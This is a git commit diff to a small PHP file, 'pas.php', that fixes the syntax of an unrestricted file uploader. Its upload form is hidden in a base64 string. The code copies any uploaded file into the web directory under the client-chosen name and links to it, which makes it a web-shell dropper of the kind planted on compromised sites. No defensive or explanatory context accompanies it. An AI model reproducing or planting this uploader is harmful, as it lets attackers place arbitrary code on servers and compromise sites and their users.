e514e6d66f78a170ab632cd9822dd5fc98202b65
imam mrtdho <88535491+Mr-7Mind@users.noreply.github.com>
2023-05-19 18:30:44 +0800

    Update pas.php

--- pas.php
+++ pas.php
@@ -1,7 +1,6 @@
 <?php
 echo(base64_decode("PGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz48aW5wdXQgdHlwZT0nZmlsZSduYW1lPSdmJyAvPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSd1cCcgLz48L2Zvcm0+"));
- @copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
- echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
-}
-}__halt_compiler()
+@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
+echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
+__halt_compiler();
 ?>
